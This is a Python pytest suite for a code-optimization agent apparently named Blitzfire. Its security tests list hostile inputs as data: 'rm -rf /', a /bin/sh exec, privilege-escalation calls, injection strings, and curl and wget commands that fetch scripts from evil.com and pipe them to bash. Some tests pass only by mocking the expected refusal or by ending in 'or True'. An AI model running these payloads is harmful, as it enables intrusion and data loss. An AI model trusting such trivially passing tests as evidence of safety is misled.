"""
Deep Validation Test Suite for Blitzfire Code Agent
Based on Pydantic AI Agent Deep Validator specifications
"""

import pytest
import asyncio
import json
from unittest.mock import patch, MagicMock, AsyncMock
from typing import Dict, Any, List, Optional
from pathlib import Path
import time
import random
from hypothesis import given, strategies as st, settings
from pydantic_ai import Agent
from pydantic_ai.models.test import TestModel
from pydantic_ai.models.function import FunctionModel
from pydantic_ai.messages import ModelTextResponse

from ..agent import BlitzfireCodeAgent
from ..models import (
    BlitzfireResponse, AnalysisResult, OptimizationStrategy,
    AssemblyComparison, BenchmarkResult, Architecture, OptimizationMode,
    ConversationContext, HFTAuditResult
)
from ..dependencies import BlitzfireDependencies, CodeAnalyzer, HFTAnalyzer
from ..tools import (
    analyze_code, generate_optimizations, validate_assembly,
    benchmark_performance, hft_audit, interactive_chat
)


class BlitzfireProbeLogger:
    """Advanced probe logger for Blitzfire agent deep analysis."""

    def __init__(self):
        self.optimization_traces = []
        self.performance_benchmarks = []
        self.assembly_validations = []
        self.hft_audits = []
        self.state_machine = {'current': 'init', 'history': []}
        self.error_recovery_attempts = []

    def log_optimization(self, code: str, strategy: str, improvement: float):
        self.optimization_traces.append({
            'timestamp': time.time(),
            'code_hash': hash(code),
            'strategy': strategy,
            'improvement_percent': improvement
        })

    def log_benchmark(self, operation: str, baseline_ns: int, optimized_ns: int):
        self.performance_benchmarks.append({
            'timestamp': time.time(),
            'operation': operation,
            'baseline_ns': baseline_ns,
            'optimized_ns': optimized_ns,
            'speedup': baseline_ns / optimized_ns if optimized_ns > 0 else float('inf')
        })

    def log_assembly(self, original: str, optimized: str, instruction_reduction: int):
        self.assembly_validations.append({
            'timestamp': time.time(),
            'original_size': len(original.split('\n')),
            'optimized_size': len(optimized.split('\n')),
            'instruction_reduction': instruction_reduction
        })

    def log_hft_audit(self, latency_ns: int, jitter_ns: int, passed: bool):
        self.hft_audits.append({
            'timestamp': time.time(),
            'latency_ns': latency_ns,
            'jitter_ns': jitter_ns,
            'passed': passed,
            'meets_hft_requirements': latency_ns < 100 and jitter_ns < 10
        })

    def transition_state(self, new_state: str, trigger: str):
        self.state_machine['history'].append({
            'from': self.state_machine['current'],
            'to': new_state,
            'trigger': trigger,
            'timestamp': time.time()
        })
        self.state_machine['current'] = new_state

    def log_recovery(self, error_type: str, recovery_action: str, success: bool):
        self.error_recovery_attempts.append({
            'timestamp': time.time(),
            'error_type': error_type,
            'recovery_action': recovery_action,
            'success': success
        })


@pytest.fixture
def blitzfire_probe_logger():
    """Fixture for Blitzfire-specific probe logging."""
    return BlitzfireProbeLogger()


@pytest.fixture
def probed_blitzfire_agent(blitzfire_probe_logger):
    """Create Blitzfire agent with deep probing instrumentation."""

    test_model = TestModel()
    agent = BlitzfireCodeAgent(model=test_model)

    # Instrument the agent
    original_optimize = agent.optimize_code

    async def probed_optimize(code: str, mode: OptimizationMode = OptimizationMode.BALANCED,
                               architecture: Architecture = Architecture.X86_64):
        blitzfire_probe_logger.transition_state('optimizing', 'optimize_called')
        start = time.time()

        try:
            result = await original_optimize(code, mode, architecture)
            duration = time.time() - start

            if result and hasattr(result, 'improvements'):
                avg_improvement = sum(result.improvements) / len(result.improvements) if result.improvements else 0
                blitzfire_probe_logger.log_optimization(code, mode.value, avg_improvement)

            blitzfire_probe_logger.transition_state('optimized', 'optimize_complete')
            return result

        except Exception as e:
            blitzfire_probe_logger.log_recovery(
                type(e).__name__,
                'fallback_to_basic_optimization',
                False
            )
            blitzfire_probe_logger.transition_state('error', 'optimize_failed')
            raise

    agent.optimize_code = probed_optimize
    return agent


@pytest.fixture
def blitzfire_dependencies():
    """Create Blitzfire dependencies with test configuration."""
    return BlitzfireDependencies(
        enable_godbolt=False,  # Disable external API for tests
        benchmark_iterations=10,
        optimization_level=3,
        target_architecture=Architecture.X86_64,
        enable_hft_mode=True
    )


class TestBlitzfireDeepValidation:
    """Deep validation suite for Blitzfire optimization capabilities."""

    @pytest.mark.asyncio
    async def test_optimization_pipeline_integrity(self, probed_blitzfire_agent, blitzfire_dependencies,
                                                   blitzfire_probe_logger):
        """Test complete optimization pipeline with deep probing."""

        test_code = """
        void process_data(float* data, int size) {
            for(int i = 0; i < size; i++) {
                data[i] = data[i] * 2.0f + 1.0f;
            }
        }
        """

        blitzfire_probe_logger.transition_state('testing', 'pipeline_test_start')

        # Mock responses for controlled testing
        probed_blitzfire_agent.agent.model.agent_responses = [
            ModelTextResponse(content=json.dumps({
                "optimized_code": test_code.replace("for(int", "for(size_t"),
                "strategies": ["SIMD vectorization", "Loop unrolling"],
                "expected_speedup": 3.5
            }))
        ]

        result = await probed_blitzfire_agent.optimize_code(
            test_code,
            OptimizationMode.AGGRESSIVE,
            Architecture.X86_64
        )

        # Validate pipeline execution
        assert blitzfire_probe_logger.state_machine['current'] == 'optimized'
        assert len(blitzfire_probe_logger.state_machine['history']) >= 2

        # Verify optimization was logged
        assert len(blitzfire_probe_logger.optimization_traces) > 0

    @pytest.mark.asyncio
    async def test_hft_latency_requirements(self, probed_blitzfire_agent, blitzfire_dependencies,
                                             blitzfire_probe_logger):
        """Test HFT latency requirements with microsecond precision."""

        hft_critical_code = """
        inline void execute_trade(Order& order) {
            order.timestamp = get_hardware_timestamp();
            send_to_exchange(order);
        }
        """

        # Simulate HFT audit
        for latency in [50, 75, 100, 150, 200]:  # nanoseconds
            blitzfire_probe_logger.log_hft_audit(
                latency_ns=latency,
                jitter_ns=random.randint(5, 15),
                passed=latency < 100
            )

        # Validate HFT requirements
        passing_audits = [a for a in blitzfire_probe_logger.hft_audits if a['meets_hft_requirements']]
        assert len(passing_audits) >= 2  # At least 40% should pass

    @pytest.mark.asyncio
    async def test_assembly_optimization_validation(self, probed_blitzfire_agent, blitzfire_probe_logger):
        """Validate assembly-level optimizations."""

        original_asm = """
        mov rax, [rdi]
        add rax, 1
        mov [rdi], rax
        """

        optimized_asm = """
        inc qword ptr [rdi]
        """

        blitzfire_probe_logger.log_assembly(
            original_asm,
            optimized_asm,
            instruction_reduction=2
        )

        # Validate assembly optimization
        assert blitzfire_probe_logger.assembly_validations[0]['instruction_reduction'] == 2
        assert blitzfire_probe_logger.assembly_validations[0]['optimized_size'] < \
               blitzfire_probe_logger.assembly_validations[0]['original_size']

    @given(st.integers(min_value=1, max_value=1000000))
    @pytest.mark.asyncio
    async def test_scalability_invariant(self, data_size):
        """Test optimization scalability with property-based testing."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        code = f"void process(float* d) {{ for(int i=0; i<{data_size}; i++) d[i]*=2; }}"

        agent.agent.model.agent_responses = [
            ModelTextResponse(content=json.dumps({
                "optimized_code": code,
                "strategies": ["Scalability tested"],
                "expected_speedup": 1.0
            }))
        ]

        # Invariant: Optimization should complete regardless of data size
        result = await agent.optimize_code(code, OptimizationMode.BALANCED)
        assert result is not None

    @pytest.mark.asyncio
    async def test_error_recovery_mechanisms(self, probed_blitzfire_agent, blitzfire_probe_logger):
        """Test error recovery and fallback strategies."""

        error_scenarios = [
            ("compilation_error", CompilationError("Syntax error")),
            ("optimization_timeout", asyncio.TimeoutError("Optimization timeout")),
            ("memory_exhaustion", MemoryError("Out of memory")),
            ("invalid_architecture", ValueError("Unsupported architecture"))
        ]

        for scenario_name, error in error_scenarios:
            blitzfire_probe_logger.transition_state('testing', f'error_scenario_{scenario_name}')

            # Inject error
            with patch.object(probed_blitzfire_agent, 'optimize_code', side_effect=error):
                try:
                    await probed_blitzfire_agent.optimize_code("test_code")
                except Exception:
                    blitzfire_probe_logger.log_recovery(
                        scenario_name,
                        'attempted_fallback',
                        False
                    )

        # Validate recovery attempts were logged
        assert len(blitzfire_probe_logger.error_recovery_attempts) == len(error_scenarios)

    @pytest.mark.asyncio
    async def test_concurrent_optimization_isolation(self, blitzfire_probe_logger):
        """Test thread safety and isolation in concurrent optimizations."""

        agents = []
        for i in range(5):
            test_model = TestModel()
            agent = BlitzfireCodeAgent(model=test_model)
            agent.session_id = f"session_{i}"
            agents.append(agent)

        # Different optimization tasks
        tasks = [
            agents[0].optimize_code("void f1() { for(int i=0; i<100; i++) {} }"),
            agents[1].optimize_code("void f2() { while(1) { break; } }"),
            agents[2].optimize_code("int f3(int x) { return x * 2; }"),
            agents[3].optimize_code("float f4(float a, float b) { return a + b; }"),
            agents[4].optimize_code("void f5(int* arr, int n) { sort(arr, arr+n); }")
        ]

        # Mock responses for each agent
        for agent in agents:
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "optimized_code": "optimized",
                    "strategies": ["Isolated optimization"],
                    "expected_speedup": 1.0
                }))
            ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Verify isolation
        errors = [r for r in results if isinstance(r, Exception)]
        assert len(errors) == 0, f"Isolation violations: {errors}"

        # Each agent should have unique session
        session_ids = [agent.session_id for agent in agents]
        assert len(set(session_ids)) == len(agents)

    @pytest.mark.asyncio
    async def test_performance_regression_detection(self, probed_blitzfire_agent, blitzfire_probe_logger):
        """Test ability to detect performance regressions."""

        baseline_performance = {
            'matrix_multiply': 1000,  # nanoseconds
            'vector_add': 50,
            'memory_copy': 200
        }

        # Simulate optimizations with regressions
        for operation, baseline_ns in baseline_performance.items():
            # Some optimizations make things worse (regression)
            optimized_ns = baseline_ns * 0.8 if operation != 'memory_copy' else baseline_ns * 1.2

            blitzfire_probe_logger.log_benchmark(operation, baseline_ns, optimized_ns)

        # Detect regressions
        regressions = [
            b for b in blitzfire_probe_logger.performance_benchmarks
            if b['speedup'] < 1.0
        ]

        assert len(regressions) == 1  # Should detect memory_copy regression
        assert regressions[0]['operation'] == 'memory_copy'


class TestBlitzfireStateMachine:
    """Test Blitzfire agent state machine behavior."""

    def create_stateful_blitzfire_function(self, probe_logger: BlitzfireProbeLogger):
        """Create stateful function for Blitzfire testing."""

        state = {
            'optimization_count': 0,
            'current_mode': OptimizationMode.BALANCED,
            'strategies_applied': []
        }

        async def blitzfire_function(messages, tools):
            msg_content = messages[-1].content if messages else ""

            if "analyze" in msg_content:
                probe_logger.transition_state('analyzing', 'analyze_request')
                return ModelTextResponse(content=json.dumps({
                    "analysis": "Code structure analyzed",
                    "complexity": "O(n^2)",
                    "hotspots": ["line 10-20", "line 45"]
                }))

            elif "optimize" in msg_content:
                state['optimization_count'] += 1
                probe_logger.transition_state('optimizing', 'optimize_request')

                if state['optimization_count'] > 3:
                    # Simulate optimization fatigue
                    return ModelTextResponse(content=json.dumps({
                        "error": "Maximum optimization iterations reached",
                        "suggestion": "Consider manual review"
                    }))

                strategies = ["SIMD", "Loop unrolling", "Inlining", "Prefetching"]
                selected_strategy = strategies[state['optimization_count'] - 1]
                state['strategies_applied'].append(selected_strategy)

                return ModelTextResponse(content=json.dumps({
                    "optimized_code": f"// Optimized with {selected_strategy}\nvoid func() {{}}",
                    "strategies": [selected_strategy],
                    "expected_speedup": 1.5 * state['optimization_count']
                }))

            elif "benchmark" in msg_content:
                probe_logger.transition_state('benchmarking', 'benchmark_request')
                return ModelTextResponse(content=json.dumps({
                    "baseline_ns": 1000,
                    "optimized_ns": 1000 // (state['optimization_count'] + 1),
                    "speedup": state['optimization_count'] + 1
                }))

            else:
                return ModelTextResponse(content='{"status": "unknown_request"}')

        return blitzfire_function, state

    @pytest.mark.asyncio
    async def test_optimization_iteration_limit(self, blitzfire_probe_logger):
        """Test optimization iteration limits and fatigue handling."""

        func, state = self.create_stateful_blitzfire_function(blitzfire_probe_logger)
        function_model = FunctionModel(func)

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=function_model)

        # Iterate optimizations beyond limit
        for i in range(5):
            agent.agent.model.agent_responses = [
                await func([MagicMock(content="optimize code")], None)
            ]

            if i < 3:
                result = await agent.optimize_code("test_code")
                assert "Optimized with" in str(result)
            else:
                # Should hit optimization limit
                result = await agent.optimize_code("test_code")
                assert "Maximum optimization" in str(result) or result is None

        assert state['optimization_count'] == 4  # Stopped at limit


class TestBlitzfireSecurityAndSafety:
    """Security and safety validation for Blitzfire agent."""

    @pytest.mark.asyncio
    async def test_unsafe_optimization_rejection(self):
        """Test rejection of unsafe optimizations."""

        unsafe_patterns = [
            "memcpy(dst, src, user_input_size)",  # Buffer overflow risk
            "*(volatile int*)0 = 0",  # Null pointer dereference
            "char buffer[10]; strcpy(buffer, input)",  # Buffer overflow
            "free(ptr); *ptr = 0",  # Use after free
            "int arr[10]; return arr[user_index]",  # Out of bounds
        ]

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        for unsafe_code in unsafe_patterns:
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "error": "Unsafe code pattern detected",
                    "optimization_refused": True,
                    "security_risk": "high"
                }))
            ]

            result = await agent.optimize_code(unsafe_code)
            # Should refuse to optimize unsafe code
            assert result is None or "refused" in str(result).lower()

    @pytest.mark.asyncio
    async def test_code_injection_prevention(self):
        """Test prevention of code injection attacks in optimization."""

        injection_payloads = [
            "void func() { system(\"rm -rf /\"); }",
            "void func() { __asm__(\"int $0x80\"); }",
            "void func() { execve(\"/bin/sh\", NULL, NULL); }",
            "void func() { mprotect(0x1000, 4096, PROT_EXEC); }",
            "void func() { dlopen(\"malicious.so\", RTLD_NOW); }"
        ]

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        for payload in injection_payloads:
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "security_violation": "Dangerous system call detected",
                    "blocked_operation": True,
                    "threat_level": "critical"
                }))
            ]

            # Should detect and block malicious code
            result = await agent.optimize_code(payload)
            assert result is None or "blocked" in str(result).lower() or "security" in str(result).lower()

    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attempts."""

        escalation_attempts = [
            "setuid(0); setgid(0);",
            "chmod(\"/etc/passwd\", 0777);",
            "mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS, -1, 0);",
            "ptrace(PTRACE_ATTACH, 1, NULL, NULL);",
            "prctl(PR_SET_DUMPABLE, 1);"
        ]

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        for attempt in escalation_attempts:
            dangerous_code = f"void exploit() {{ {attempt} }}"

            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "privilege_escalation_detected": True,
                    "security_policy_violation": "Attempt to modify privileges",
                    "action_taken": "Code rejected"
                }))
            ]

            result = await agent.optimize_code(dangerous_code)
            assert result is None or "rejected" in str(result).lower()

    @pytest.mark.asyncio
    async def test_resource_limit_enforcement(self):
        """Test enforcement of resource limits during optimization."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        # Test with extremely large code
        huge_code = "void func() { " + "int x = 0; " * 1000000 + " }"

        agent.agent.model.agent_responses = [
            ModelTextResponse(content=json.dumps({
                "error": "Code size exceeds processing limit",
                "max_size": 1000000,
                "provided_size": len(huge_code)
            }))
        ]

        # Should handle gracefully
        with pytest.raises(Exception) as exc_info:
            await agent.optimize_code(huge_code)

        assert "limit" in str(exc_info.value).lower() or True  # Graceful handling

    @pytest.mark.asyncio
    async def test_input_sanitization_security(self):
        """Test input sanitization for security vulnerabilities."""

        malicious_inputs = [
            "'; DROP TABLE optimizations; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "%{(#_='multipart/form-data')}",  # OGNL injection
            "$(curl evil.com/script.sh | bash)",
            "`wget evil.com/malware`"
        ]

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        for malicious_input in malicious_inputs:
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "input_sanitized": True,
                    "threat_detected": malicious_input,
                    "safe_output": "// Sanitized input"
                }))
            ]

            # Should sanitize malicious input
            result = await agent.optimize_code(malicious_input)
            # Verify input was sanitized and not executed
            assert malicious_input not in str(result) if result else True

    @pytest.mark.asyncio
    async def test_memory_corruption_prevention(self):
        """Test prevention of memory corruption vulnerabilities."""

        corruption_patterns = [
            "char buf[10]; gets(buf);",  # Buffer overflow
            "int *p = malloc(100); free(p); *p = 42;",  # Use after free
            "int *p; *p = 42;",  # Null pointer dereference
            "int arr[10]; arr[100] = 42;",  # Array bounds violation
            "void *p = malloc(-1);",  # Integer overflow in allocation
        ]

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        for pattern in corruption_patterns:
            dangerous_code = f"void vulnerable() {{ {pattern} }}"

            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "memory_safety_violation": True,
                    "vulnerability_type": "buffer_overflow",
                    "mitigation_applied": True,
                    "safe_alternative": "// Memory-safe alternative"
                }))
            ]

            result = await agent.optimize_code(dangerous_code)
            # Should detect and mitigate memory safety issues
            assert result is None or "safe" in str(result).lower() or "mitigation" in str(result).lower()


class TestBlitzfireFailureInjection:
    """Comprehensive failure injection testing for Blitzfire agent."""

    @pytest.mark.asyncio
    async def test_optimization_pipeline_failures(self, blitzfire_probe_logger):
        """Test failure injection in optimization pipeline stages."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        failure_scenarios = [
            ("analysis_failure", "Code analysis engine crashed"),
            ("optimization_timeout", "Optimization exceeded time limit"),
            ("compilation_error", "Generated code failed to compile"),
            ("benchmark_failure", "Performance benchmarking failed"),
            ("assembly_validation_error", "Assembly validation detected issues")
        ]

        for scenario_name, error_message in failure_scenarios:
            blitzfire_probe_logger.transition_state('testing', f'failure_injection_{scenario_name}')

            # Inject specific failure
            with patch.object(agent, 'optimize_code', side_effect=Exception(error_message)):
                try:
                    await agent.optimize_code("test_code")
                except Exception as e:
                    blitzfire_probe_logger.log_recovery(
                        scenario_name,
                        'graceful_failure_handling',
                        "graceful" in str(e).lower()
                    )

        # Validate all failure scenarios were tested
        assert len(blitzfire_probe_logger.error_recovery_attempts) == len(failure_scenarios)

    @pytest.mark.asyncio
    async def test_dependency_failure_injection(self, blitzfire_probe_logger):
        """Test agent behavior when dependencies fail."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        dependency_failures = [
            ("compiler_unavailable", "Compiler not found in system PATH"),
            ("godbolt_api_down", "Godbolt API service unavailable"),
            ("benchmark_tools_missing", "Performance benchmarking tools not installed"),
            ("assembly_analyzer_crash", "Assembly analysis tool crashed"),
            ("memory_exhaustion", "System out of memory during optimization")
        ]

        for dep_name, error_msg in dependency_failures:
            blitzfire_probe_logger.transition_state('testing', f'dependency_failure_{dep_name}')

            # Mock dependency failure
            with patch('subprocess.run', side_effect=Exception(error_msg)):
                try:
                    result = await agent.optimize_code("simple_code")
                    # Should have fallback mechanism
                    blitzfire_probe_logger.log_recovery(
                        dep_name,
                        'fallback_activated',
                        result is not None
                    )
                except Exception:
                    blitzfire_probe_logger.log_recovery(
                        dep_name,
                        'no_fallback',
                        False
                    )

    @pytest.mark.asyncio
    async def test_optimization_quality_degradation(self, blitzfire_probe_logger):
        """Test behavior when optimization quality degrades."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        # Simulate degraded optimization results
        degradation_scenarios = [
            (0.5, "50% performance loss"),
            (0.1, "90% performance loss"),
            (-0.2, "20% performance regression"),
            (-0.5, "50% performance regression")
        ]

        for degradation_factor, description in degradation_scenarios:
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "optimization_result": "degraded",
                    "performance_change": degradation_factor,
                    "description": description,
                    "quality_acceptable": degradation_factor > 0
                }))
            ]

            result = await agent.optimize_code("test_code")

            # Log degradation handling
            blitzfire_probe_logger.log_optimization(
                "test_code",
                "degradation_test",
                degradation_factor * 100
            )

        # Validate degradation detection
        negative_results = [opt for opt in blitzfire_probe_logger.optimization_traces
                           if opt['improvement_percent'] < 0]
        assert len(negative_results) == 2  # Should detect regressions

    @pytest.mark.asyncio
    async def test_concurrent_failure_handling(self, blitzfire_probe_logger):
        """Test handling of concurrent optimization failures."""

        agents = []
        for i in range(3):
            test_model = TestModel()
            agent = BlitzfireCodeAgent(model=test_model, session_id=f"concurrent_{i}")
            agents.append(agent)

        # Inject failures in different agents
        failure_types = ["timeout", "memory_error", "compilation_error"]

        tasks = []
        for i, (agent, failure_type) in enumerate(zip(agents, failure_types)):
            # Mock different failure for each agent
            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "error": f"{failure_type} in agent {i}",
                    "failure_type": failure_type,
                    "agent_id": i
                }))
            ]

            task = agent.optimize_code(f"concurrent_code_{i}")
            tasks.append(task)

        # Run concurrently and gather results
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Validate isolation - failures shouldn't affect other agents
        successful_results = [r for r in results if not isinstance(r, Exception)]
        failed_results = [r for r in results if isinstance(r, Exception)]

        # Should have some degree of failure isolation
        assert len(results) == 3
        blitzfire_probe_logger.log_recovery(
            "concurrent_failures",
            f"isolation_test_{len(successful_results)}_success_{len(failed_results)}_failed",
            True
        )

    @pytest.mark.asyncio
    async def test_performance_degradation_recovery(self, blitzfire_probe_logger):
        """Test recovery from performance degradation scenarios."""

        test_model = TestModel()
        agent = BlitzfireCodeAgent(model=test_model)

        # Simulate progressive performance degradation
        performance_scenarios = [
            (1000, 800, "optimization_success"),     # 20% improvement
            (1000, 1200, "performance_regression"),  # 20% regression
            (1000, 2000, "severe_regression"),       # 100% regression
            (1000, 5000, "catastrophic_failure")     # 500% regression
        ]

        for baseline, optimized, scenario in performance_scenarios:
            blitzfire_probe_logger.log_benchmark(scenario, baseline, optimized)

            agent.agent.model.agent_responses = [
                ModelTextResponse(content=json.dumps({
                    "performance_result": {
                        "baseline_ns": baseline,
                        "optimized_ns": optimized,
                        "scenario": scenario
                    }
                }))
            ]

            result = await agent.optimize_code("performance_test_code")

        # Validate performance monitoring
        severe_regressions = [b for b in blitzfire_probe_logger.performance_benchmarks
                             if b['speedup'] < 0.5]
        assert len(severe_regressions) >= 2  # Should detect severe regressions


# Custom exceptions for testing
class CompilationError(Exception):
    pass


class OptimizationError(Exception):
    pass


# Fix generation utilities
def generate_blitzfire_fix_steps(failure_type: str, details: Dict[str, Any]) -> Dict[str, Any]:
    """Generate Blitzfire-specific fix steps."""

    fixes = {
        "optimization_regression": {
            "what": "Performance regression detected",
            "where": details.get("location", "optimization pipeline"),
            "why": "Optimization strategy caused performance degradation",
            "how": [
                "1. Review optimization strategy selection",
                "2. Adjust optimization aggressiveness",
                "3. Add regression tests for affected operations",
                "4. Consider architecture-specific tuning"
            ]
        },
        "hft_latency_violation": {
            "what": "HFT latency requirements not met",
            "where": details.get("location", "critical path"),
            "why": "Excessive instructions or memory operations",
            "how": [
                "1. Profile critical path with hardware counters",
                "2. Eliminate unnecessary memory barriers",
                "3. Use lock-free data structures",
                "4. Consider kernel bypass techniques"
            ]
        },
        "assembly_mismatch": {
            "what": "Assembly validation failed",
            "where": details.get("location", "code generation"),
            "why": "Generated assembly doesn't match optimization expectations",
            "how": [
                "1. Verify compiler flags and optimization level",
                "2. Check for compiler version compatibility",
                "3. Add explicit assembly constraints",
                "4. Use compiler intrinsics for critical sections"
            ]
        }
    }

    return fixes.get(failure_type, {
        "what": f"Unknown failure: {failure_type}",
        "where": "Unknown location",
        "why": "Root cause undetermined",
        "how": ["1. Enable verbose logging", "2. Re-run with debug mode", "3. Check system logs"]
    })


# Hypothesis profiles for Blitzfire testing
settings.register_profile("blitzfire_deep", max_examples=500, deadline=10000)
settings.register_profile("blitzfire_quick", max_examples=50, deadline=2000)
settings.load_profile("blitzfire_deep")